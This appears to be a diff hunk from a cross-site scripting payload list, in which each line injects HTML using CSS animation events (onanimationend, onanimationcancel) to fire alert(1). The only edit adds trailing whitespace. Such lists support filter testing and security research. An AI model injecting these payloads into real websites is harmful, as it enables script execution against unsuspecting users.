@@ -283,7 +283,7 @@
 <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><wbr id=x style="position:absolute;" onanimationcancel="alert(1)"></wbr>
 <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xmp id=x style="position:absolute;" onanimationcancel="alert(1)"></xmp>
 <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xmp id=x style="position:absolute;" onanimationcancel="alert(1)"></xmp>
-<style>@keyframes x{}</style><a style="animation-name:x" onanimationend="alert(1)"></a>
+<style>@keyframes x{}</style><a style="animation-name:x" onanimationend="alert(1)"></a> 
 <style>@keyframes x{}</style><abbr style="animation-name:x" onanimationend="alert(1)"></abbr>
 <style>@keyframes x{}</style><acronym style="animation-name:x" onanimationend="alert(1)"></acronym>
 <style>@keyframes x{}</style><address style="animation-name:x" onanimationend="alert(1)"></address>
